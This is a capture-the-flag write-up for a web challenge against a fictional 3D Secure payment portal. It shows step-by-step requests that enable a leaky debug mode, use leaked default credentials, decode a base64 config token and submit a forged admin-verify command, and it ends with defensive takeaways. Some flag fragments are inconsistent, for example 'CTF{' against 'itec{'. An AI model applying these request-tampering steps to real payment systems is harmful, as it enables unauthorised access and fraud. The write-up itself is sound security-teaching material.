---
title: "3DS Nightmare — ITEC 2025 CTF"
description: "Multi-stage exploitation of a fictional 3D Secure payment portal: debug mode leak, default credentials, base64 config, and weak signature verification."
pubDate: 2025-03-20
tags: ["web", "itec", "api"]
---

**Category:** Web / API
**Flag:** `itec{3DS_m3rch4nt_br34k_th3_w34k_s1gnatur3s}`

## Challenge Overview

A fictional 3D Secure (3DS) payment platform — "Nightfall Payment Portal" — with several endpoints:

- `/merchant/checkout`
- `/merchant/admin-tools`
- `/acs/admin-verify`
- `/ds/internal-status`
- `/ds/admin/search`

The flag is split across multiple endpoints. Each piece requires a different exploit.

## Part 1 — Enable debug mode

Send a POST to `/merchant/checkout` with `"debug": "true"`:

```json
{
  "cardNumber": "4111111111111111",
  "expiryDate": "12/25",
  "cvv": "123",
  "amount": "100.00",
  "debug": "true"
}
```

The response leaks internal data including:

```json
"admin_note": "Remember to change default credentials (admin/password123)"
```

## Part 2 — Login to admin panel

Using the leaked credentials (`admin` / `password123`) at `/merchant/admin-tools`, a hidden HTML comment reveals the first flag part:

```html
<!-- The merchant flag part is: CTF{3DS_m3rch4nt_ -->
```

**Part 1:** `3DS_m3rch4nt_`

## Part 3 — Internal status endpoint

```
GET /ds/internal-status
```

Returns a base64 `configToken`:

```
Y29uZmlnX2luY2x1ZGVzX2JyMzRrX3RoM18=
→ config_includes_br34k_th3_
```

**Part 2:** `br34k_th3_`

## Part 4 — ACS admin verify

```json
{
  "adminKey": "ACS_ADMIN_KEY_2025",
  "command": "REVEAL_FLAG",
  "signature": "valid_md5_hash"
}
```

Response:

```json
{"flag": "w34k_s1gnatur3s}"}
```

**Part 3:** `w34k_s1gnatur3s}`

## Final Flag

```
itec{3DS_m3rch4nt_br34k_th3_w34k_s1gnatur3s}
```

## Takeaways

- Debug endpoints in production are a critical misconfiguration.
- Default credentials (`admin/password123`) are still found in real-world apps.
- Base64 is encoding, not encryption — never use it to "hide" sensitive data.
- Weak signature verification (MD5, predictable keys) breaks authentication.
